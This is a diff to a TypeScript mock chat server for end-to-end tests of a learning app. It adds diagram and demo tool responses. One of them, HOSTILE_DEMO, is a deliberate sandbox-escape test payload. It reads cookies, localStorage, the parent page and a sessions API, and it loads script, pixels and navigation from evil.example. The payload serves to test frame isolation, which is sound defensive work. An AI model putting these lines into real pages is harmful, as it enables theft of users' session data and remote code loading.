@@ -13,6 +13,9 @@
 // - `#assess` in the learner's message, with `submit_assessment` offered: an assessment;
 // - `#done`, with `complete_step` offered: completes step `basics` (the last one: the session ends);
 // - `#cite`, with source excerpts in the system prompt: an answer citing [S1];
+// - `#diagram`, `#mermaid`, `#demo`, `#hostile` with the figure tools offered (phase 5): an SVG
+//   diagram, a Mermaid flowchart, a small demo, or a demo that tries every way out of its frame
+//   (`HOSTILE_DEMO`), then "Noted." after the tool result;
 // - `hold`: streams a first chunk and waits until `POST /release/<apiKey>` (the key of the test's
 //   own connection, so parallel tests do not release each other's turns);
 // - otherwise it repeats the message.
@@ -126,6 +129,54 @@ const structuredAnswer = (request: ChatRequest, input: string): unknown => {
     };
   }
   return undefined;
+};
+
+/**
+ * A demo that tries to leave its frame: app storage, the parent, the network, navigation. No
+ * `<script src>`: show_demo refuses it before it gets anywhere (e2e/figures.e2e.ts covers the frame).
+ */
+export const HOSTILE_DEMO = [
+  '<p id="out">start</p>',
+  '<script>',
+  "const out = document.getElementById('out'); const notes = [];",
+  "try { notes.push('ls:' + localStorage.getItem('kd-learn.mode')); } catch (e) { notes.push('ls:blocked'); }",
+  "try { notes.push('parent:' + parent.document.title); } catch (e) { notes.push('parent:blocked'); }",
+  "try { notes.push('cookie:' + document.cookie); } catch (e) { notes.push('cookie:blocked'); }",
+  "fetch('/api/account/sessions').then(() => notes.push('api:ran'), () => notes.push('api:blocked'));",
+  "fetch('https://evil.example/fetch').then(() => notes.push('fetch:ran'), () => notes.push('fetch:blocked'));",
+  "const s = document.createElement('script'); s.src = 'https://evil.example/dynamic.js'; document.head.append(s);",
+  "new Image().src = 'https://evil.example/pixel.png';",
+  "setTimeout(() => { out.textContent = notes.join(' '); }, 300);",
+  "setTimeout(() => { location.href = 'https://evil.example/navigate'; }, 1500);",
+  '</script>',
+].join('\n');
+
+const FIGURES: Record<string, { tool: string; input: unknown }> = {
+  '#diagram': {
+    tool: 'show_diagram',
+    input: {
+      kind: 'svg',
+      title: 'Two halves',
+      source:
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 40"><rect width="40" height="40" fill="var(--kd-accent)"/><rect x="40" width="40" height="40" fill="var(--kd-cat-2)"/></svg>',
+    },
+  },
+  '#mermaid': {
+    tool: 'show_diagram',
+    input: {
+      kind: 'mermaid',
+      title: 'Steps',
+      source: 'flowchart LR\n  A[Read] --> B[Try] --> C[Check]',
+    },
+  },
+  '#demo': {
+    tool: 'show_demo',
+    input: {
+      title: 'Counter',
+      html: "<button id=\"inc\">+1</button> <span id=\"count\">0</span><script>let n = 0; document.getElementById('inc').addEventListener('click', () => { document.getElementById('count').textContent = String(++n); });</script>",
+    },
+  },
+  '#hostile': { tool: 'show_demo', input: { title: 'Hostile', html: HOSTILE_DEMO } },
 };
 
 const toolCall = (response: ServerResponse, name: string, input: unknown) => {
@@ -271,6 +322,13 @@ const server = createServer((request, response) => {
         strengths: [],
         gaps: ['The basics'],
       });
+    } else if (
+      Object.entries(FIGURES).some(
+        ([word, figure]) => last.includes(word) && tools.has(figure.tool),
+      )
+    ) {
+      const [, figure] = Object.entries(FIGURES).find(([word]) => last.includes(word))!;
+      return toolCall(response, figure.tool, figure.input);
     } else if (last.includes('#done') && tools.has('complete_step')) {
       return toolCall(response, 'complete_step', { stepId: 'basics' });
     } else if (
